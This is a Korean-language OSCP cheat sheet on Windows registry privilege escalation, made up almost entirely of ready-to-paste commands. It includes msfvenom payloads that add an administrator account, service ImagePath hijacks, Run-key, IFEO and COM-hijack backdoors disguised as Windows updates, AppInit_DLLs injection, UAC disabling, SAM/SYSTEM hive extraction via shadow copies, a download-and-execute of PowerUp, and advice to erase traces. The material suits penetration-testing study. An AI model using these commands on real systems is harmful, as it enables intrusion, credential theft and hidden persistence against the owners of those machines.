# Windows Registry Abuse Privilege Escalation

> **OSCP 핵심**: Windows 레지스트리 설정 오류를 악용하여 즉시 SYSTEM 권한 획득하는 검증된 방법들

## ⚡ 즉시 실행할 명령어들

### 🔥 AlwaysInstallElevated 확인 (10초 안에 - 가장 중요)

```cmd
:: 가장 중요한 레지스트리 권한상승 벡터
reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2>nul
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2>nul

:: 둘 다 1로 설정되어 있으면 즉시 SYSTEM 권한 획득 가능
:: PowerShell 버전
Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
```

### 🎯 레지스트리 권한 확인 (즉시)

```cmd
:: accesschk으로 레지스트리 키 권한 확인
accesschk.exe -kwsu %USERNAME% HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services 2>nul
accesschk.exe -kwsu %USERNAME% HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>nul
accesschk.exe -kwsu Everyone HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services 2>nul

:: 서비스 레지스트리 키 직접 확인
reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s | findstr "ImagePath"
```

### ⚡ 자동 시작 프로그램 레지스트리

```cmd
:: 자동 시작 프로그램 레지스트리 키들
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

:: 권한 확인
accesschk.exe -kwsu %USERNAME% "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>nul
```

## 📋 단계별 체크리스트

### Phase 1: 핵심 레지스트리 키 확인 (2분)

- [ ] **AlwaysInstallElevated**: MSI 패키지 관리자 권한 설치 설정
- [ ] **서비스 레지스트리**: 서비스 설정을 제어하는 레지스트리 키
- [ ] **자동 시작 키**: Run, RunOnce 레지스트리 키 권한
- [ ] **환경 변수**: PATH, PATHEXT 등 시스템 환경 변수
- [ ] **UAC 설정**: UAC 우회 관련 레지스트리 설정

### Phase 2: 권한 분석 (3분)

- [ ] **Write 권한**: 레지스트리 키에 쓰기 권한 확인
- [ ] **Full Control**: 레지스트리 키에 완전한 제어 권한
- [ ] **Create Subkey**: 하위 키 생성 권한 확인
- [ ] **Set Value**: 레지스트리 값 설정 권한
- [ ] **Delete**: 키나 값 삭제 권한 확인

### Phase 3: 백업 및 숨겨진 키 (2분)

- [ ] **레지스트리 백업**: SAM, SYSTEM, SECURITY 파일
- [ ] **숨겨진 키**: 표준이 아닌 위치의 레지스트리 키
- [ ] **사용자 정의 키**: 애플리케이션별 레지스트리 키
- [ ] **이벤트 로그 키**: 로그 설정 레지스트리
- [ ] **네트워크 설정**: 네트워크 관련 레지스트리 키

### Phase 4: 익스플로잇 실행 (3-5분)

- [ ] **MSI 패키지 생성**: AlwaysInstallElevated 악용
- [ ] **레지스트리 수정**: 서비스나 자동 시작 프로그램 수정
- [ ] **권한 확인**: 수정된 설정이 적용되는지 확인
- [ ] **지속성 확보**: 백도어나 계정 생성
- [ ] **흔적 제거**: 원본 레지스트리 복구

## 🎯 발견별 즉시 익스플로잇

### 🚨 AlwaysInstallElevated 익스플로잇 (즉시 SYSTEM)

```cmd
:: 1. 설정 확인 (둘 다 1이어야 함)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

:: 2. MSI 패키지 생성 (msfvenom 사용)
msfvenom -p windows/adduser USER=hacker PASS=password123 -f msi -o evil.msi

:: 또는 관리자 계정 추가 MSI
msfvenom -p windows/exec CMD="net user hacker password123 /add & net localgroup administrators hacker /add" -f msi -o adduser.msi

:: 3. MSI 설치 (자동으로 SYSTEM 권한으로 실행됨)
msiexec /quiet /qn /i evil.msi

:: 4. 새 계정으로 로그인
runas /user:hacker cmd
```

```powershell
# PowerShell로 AlwaysInstallElevated 익스플로잇
# 1. 설정 확인
$HKCU = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$HKLM = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

if ($HKCU.AlwaysInstallElevated -eq 1 -and $HKLM.AlwaysInstallElevated -eq 1) {
    Write-Host "AlwaysInstallElevated is enabled!" -ForegroundColor Red

    # 2. 간단한 MSI 생성 (WiX Toolset 또는 다른 도구 필요)
    # 또는 사전 제작된 MSI 사용

    # 3. MSI 설치
    Start-Process msiexec -ArgumentList "/quiet /i C:\path\to\evil.msi" -Wait
}
```

### 🔧 서비스 레지스트리 수정

```cmd
:: 1. 서비스 레지스트리 키 권한 확인
accesschk.exe -kwsu %USERNAME% "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" 2>nul

:: 2. 쓰기 권한이 있는 경우 서비스 경로 변경
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\evil.exe" /f

:: 3. 서비스 시작 모드를 자동으로 변경
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" /v Start /t REG_DWORD /d 2 /f

:: 4. 서비스 재시작 또는 시스템 재부팅
sc stop VulnerableService
sc start VulnerableService

:: 5. 원본 설정 복구 (흔적 제거)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" /v ImagePath /t REG_EXPAND_SZ /d "원본경로" /f
```

### 📅 자동 시작 프로그램 레지스트리 수정

```cmd
:: 1. Run 키 권한 확인
accesschk.exe -kwsu %USERNAME% "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>nul

:: 2. 쓰기 권한이 있는 경우 자동 시작 프로그램 추가
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

:: 3. 사용자별 Run 키 (권한이 더 쉬울 수 있음)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

:: 4. RunOnce 키 (한 번만 실행)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v OneTime /t REG_SZ /d "C:\Windows\Temp\onetime.exe" /f

:: 5. 로그오프/로그온 또는 재부팅으로 실행
logoff
```

```powershell
# PowerShell로 자동 시작 프로그램 추가
# 1. 백도어 실행 파일 생성
$payload = @'
net user hacker password123 /add
net localgroup administrators hacker /add
'@
$payload | Out-File -FilePath C:\Windows\Temp\backdoor.bat -Encoding ASCII

# 2. 레지스트리에 추가
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "C:\Windows\Temp\backdoor.bat" -PropertyType String -Force

# 3. 현재 사용자 Run 키에도 추가 (보조)
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate" -Value "C:\Windows\Temp\backdoor.bat" -PropertyType String -Force
```

### 🌐 환경 변수 레지스트리 조작

```cmd
:: 1. 시스템 환경 변수 레지스트리 키 권한 확인
accesschk.exe -kwsu %USERNAME% "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" 2>nul

:: 2. PATH 환경 변수에 악성 디렉토리 추가 (앞쪽에)
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path /t REG_EXPAND_SZ /d "C:\Windows\Temp;%PATH%" /f

:: 3. 새로운 환경 변수 생성
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v EVIL_PATH /t REG_SZ /d "C:\Windows\Temp" /f

:: 4. 사용자 환경 변수 (권한이 더 쉬움)
reg add "HKCU\Environment" /v Path /t REG_EXPAND_SZ /d "C:\Windows\Temp;%PATH%" /f
```

### 🔐 UAC 우회 레지스트리 조작

```cmd
:: 1. UAC 설정 확인
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin

:: 2. UAC 비활성화 (권한이 있는 경우)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f

:: 3. 관리자 자동 승인 (권한이 있는 경우)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f

:: 4. 재부팅 필요
shutdown /r /t 0
```

### 📚 SAM/SYSTEM 레지스트리 파일 접근

```cmd
:: 1. SAM 및 SYSTEM 파일 위치
:: C:\Windows\System32\config\SAM
:: C:\Windows\System32\config\SYSTEM
:: C:\Windows\System32\config\SECURITY

:: 2. 백업 파일들 확인
dir /b /s C:\Windows\repair\SAM 2>nul
dir /b /s C:\Windows\repair\SYSTEM 2>nul
dir /b /s C:\Windows\System32\config\RegBack\ 2>nul

:: 3. 섀도우 복사본에서 SAM 파일 추출
vssadmin list shadows
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM

:: 4. 레지스트리 하이브 마운트 (권한이 있는 경우)
reg load HKLM\SAM C:\Windows\Temp\SAM
reg load HKLM\SYSTEM C:\Windows\Temp\SYSTEM

:: 5. 해시 덤프 (samdump2, pwdump 등 도구 사용)
```

```powershell
# PowerShell로 SAM 파일 접근
# 1. 볼륨 섀도우 복사본 생성
$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible')

# 2. 섀도우 복사본에서 SAM 파일 복사
$shadowPath = (Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $shadow.ShadowID }).DeviceObject
Copy-Item "$shadowPath\Windows\System32\config\SAM" -Destination "C:\Windows\Temp\SAM"
Copy-Item "$shadowPath\Windows\System32\config\SYSTEM" -Destination "C:\Windows\Temp\SYSTEM"

# 3. 섀도우 복사본 정리
$shadow = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $shadow.ShadowID }
$shadow.Delete()
```

## 🤖 자동화 도구 활용

### 🔍 PowerUp 레지스트리 분석

```powershell
# PowerUp 다운로드 및 실행
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# 레지스트리 관련 모든 검사
Invoke-AllChecks | Where-Object {$_ -like "*Registry*" -or $_ -like "*AlwaysInstall*"}

# 개별 레지스트리 검사
Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
Get-ModifiableRegistryAutoRun
```

### 🎯 WinPEAS 레지스트리 정보

```cmd
:: WinPEAS 레지스트리 관련 정보만 추출
winPEAS.exe | findstr /i "registry\|AlwaysInstall\|AutoRun"

:: 특정 레지스트리 검사
winPEAS.exe registryinfo
```

### 🔧 레지스트리 권한 종합 스캔

```cmd
:: 레지스트리 권한 종합 스캔 스크립트 (복붙용)
@echo off
echo ===== WINDOWS REGISTRY PRIVILEGE ESCALATION SCAN =====
echo.

echo [+] Checking AlwaysInstallElevated...
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2>nul
echo.

echo [+] Checking service registry permissions...
if exist accesschk.exe (
    accesschk.exe -kwsu %USERNAME% "HKLM\SYSTEM\CurrentControlSet\Services" 2>nul | findstr "KEY_ALL_ACCESS\|KEY_WRITE"
) else (
    echo AccessChk not found. Download from: https://download.sysinternals.com/files/AccessChk.zip
)
echo.

echo [+] Checking AutoRun registry permissions...
if exist accesschk.exe (
    accesschk.exe -kwsu %USERNAME% "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>nul
    accesschk.exe -kwsu %USERNAME% "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>nul
)
echo.

echo [+] Checking for stored credentials in registry...
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr "DefaultUserName\|DefaultPassword\|AltDefaultUserName\|AltDefaultPassword"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" | findstr "ProxyUser\|ProxyPass"
echo.

echo [+] Checking environment variables registry...
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
echo.

echo ===== SCAN COMPLETE =====
```

```powershell
# PowerShell 레지스트리 종합 스캔 스크립트 (복붙용)
Write-Host "===== WINDOWS REGISTRY PRIVILEGE ESCALATION SCAN =====" -ForegroundColor Green

Write-Host "`n[+] Checking AlwaysInstallElevated..." -ForegroundColor Yellow
$HKCU = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$HKLM = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
if ($HKCU.AlwaysInstallElevated -eq 1 -and $HKLM.AlwaysInstallElevated -eq 1) {
    Write-Host "VULNERABLE: AlwaysInstallElevated is enabled!" -ForegroundColor Red
}

Write-Host "`n[+] Checking AutoRun registry entries..." -ForegroundColor Yellow
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue

Write-Host "`n[+] Checking for stored credentials..." -ForegroundColor Yellow
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue | Where-Object {$_.DefaultUserName -or $_.DefaultPassword}

Write-Host "`n[+] Checking UAC settings..." -ForegroundColor Yellow
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -ErrorAction SilentlyContinue | Select-Object EnableLUA, ConsentPromptBehaviorAdmin

Write-Host "`n===== SCAN COMPLETE =====" -ForegroundColor Green
```

## 👀 놓치기 쉬운 것들

### 🚨 레지스트리 백업 및 숨겨진 파일들

```cmd
:: 1. 레지스트리 백업 파일들
dir /b /s C:\Windows\repair\ | findstr "SAM\|SYSTEM\|SECURITY"
dir /b /s C:\Windows\System32\config\RegBack\ 2>nul
dir /b /s C:\* | findstr "\.reg$" | head -20

:: 2. 사용자 프로필의 레지스트리 하이브
dir /b C:\Users\*\NTUSER.DAT 2>nul
dir /b C:\Users\*\AppData\Local\Microsoft\Windows\UsrClass.dat 2>nul

:: 3. 레지스트리 임시 파일들
dir /b /s C:\Windows\Temp\*.reg 2>nul
dir /b /s C:\Temp\*.reg 2>nul

:: 4. 애플리케이션별 레지스트리 백업
dir /b /s C:\Program*\*\*.reg 2>nul | head -10

:: 5. 시스템 복원 지점의 레지스트리
dir /b /s "C:\System Volume Information\*" 2>nul | findstr "_REGISTRY_"
```

### 🔍 고급 레지스트리 분석

```cmd
:: 1. 모든 서비스의 레지스트리 설정
for /f %i in ('sc query state^= all ^| findstr "SERVICE_NAME"') do @reg query "HKLM\SYSTEM\CurrentControlSet\Services\%i" 2>nul

:: 2. 사용자 정의 서비스들 (의심스러운 서비스)
reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s | findstr "DisplayName" | findstr /v "Microsoft\|Windows\|Intel\|AMD"

:: 3. 네트워크 관련 레지스트리 (방화벽, 프록시 등)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" | findstr "Proxy"

:: 4. 소프트웨어 언인스톨 정보 (설치된 프로그램들)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr "DisplayName\|InstallLocation"

:: 5. 최근 실행된 프로그램들
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU"

:: 6. 저장된 RDP 연결 정보
reg query "HKCU\SOFTWARE\Microsoft\Terminal Server Client\Servers"

:: 7. WiFi 프로필 정보
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles"

:: 8. USB 장치 히스토리
reg query "HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR"

:: 9. 타임존 및 시스템 설정
reg query "HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"

:: 10. 부팅 관련 레지스트리
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute"
```

### ⚡ 레지스트리 권한 우회 기법

```cmd
:: 1. 다른 사용자 컨텍스트로 레지스트리 접근
runas /user:Administrator "reg query HKLM\SAM"

:: 2. 레지스트리 하이브 파일 직접 접근
:: 시스템이 사용 중이지 않을 때 (Safe Mode 등)
copy C:\Windows\System32\config\SAM C:\Windows\Temp\

:: 3. Volume Shadow Copy를 통한 접근
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows

:: 4. 레지스트리 export/import
reg export "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" C:\Windows\Temp\backup.reg
:: 수정 후
reg import C:\Windows\Temp\modified.reg

:: 5. PowerShell을 통한 우회
powershell -Command "Get-ItemProperty 'HKLM:\SAM\SAM\Domains\Account\Users\000001F4'"

:: 6. WMI를 통한 레지스트리 접근
wmic process call create "reg query HKLM\SAM"

:: 7. 스케줄된 작업을 통한 지연 실행
schtasks /create /tn "RegMod" /tr "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\evil.exe" /sc onstart /ru system

:: 8. 서비스를 통한 레지스트리 수정
sc create RegService binpath= "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\evil.exe"
sc start RegService
sc delete RegService
```

### 🔧 레지스트리 지속성 및 은닉

```cmd
:: 1. 여러 위치에 백도어 설치
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /d "C:\Windows\Temp\backdoor.exe" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /d "C:\Windows\Temp\backdoor.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "SystemCheck" /d "C:\Windows\Temp\backdoor.exe" /f

:: 2. 서비스로 위장
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdate" /v ImagePath /d "C:\Windows\Temp\backdoor.exe" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdate" /v Start /t REG_DWORD /d 2 /f

:: 3. 정상적인 프로그램에 피기백
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Notepad"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Notepad" /d "notepad.exe & C:\Windows\Temp\backdoor.exe" /f

:: 4. 이벤트 기반 실행
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /d "C:\Windows\Temp\backdoor.exe" /f

:: 5. COM 하이재킹
reg add "HKCU\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve /d "C:\Windows\Temp\evil.dll" /f

:: 6. AppInit_DLLs (모든 프로세스에 DLL 주입)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /d "C:\Windows\Temp\evil.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f

:: 7. 시간 지연 실행
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "DelayedStart" /d "timeout 300 & C:\Windows\Temp\backdoor.exe" /f

:: 8. 조건부 실행 (특정 사용자만)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "UserSpecific" /d "if %USERNAME%==target (C:\Windows\Temp\backdoor.exe)" /f
```

## 🚨 중요 참고사항

### ⏰ 시간 관리

- **처음 2분**: AlwaysInstallElevated와 핵심 레지스트리 키 권한 확인
- **다음 3분**: accesschk으로 상세 권한 분석 및 자동화 도구 실행
- **추가 2분**: 발견된 취약점에 대한 즉시 익스플로잇 시도
- **7분 후**: 재부팅이 필요한 경우 시간 고려

### 🎯 성공률 높은 순서

1. **AlwaysInstallElevated**: 발견시 즉시 SYSTEM 권한 (거의 확실)
2. **Service Registry**: 서비스 레지스트리 키 수정 권한 (높은 성공률)
3. **AutoRun Registry**: Run 키 수정으로 지속적 접근
4. **Environment Variables**: PATH 조작으로 DLL 하이재킹
5. **UAC Settings**: UAC 우회 설정 (재부팅 필요)

### 🔥 즉시 시도할 것들

- AlwaysInstallElevated는 가장 빠른 SYSTEM 권한 획득 방법
- accesschk.exe로 레지스트리 키 권한 즉시 확인
- PowerUp 실행과 동시에 수동 확인 병행
- SAM/SYSTEM 파일 백업 위치 확인

### 💡 팁

- 레지스트리는 Windows 권한상승의 핵심 벡터
- 많은 레지스트리 수정은 재부팅이나 로그오프/로그온 필요
- 여러 위치에 백도어 설치로 지속성 확보
- 원본 레지스트리 값 백업 후 흔적 제거
- SAM 파일 접근시 Volume Shadow Copy 활용
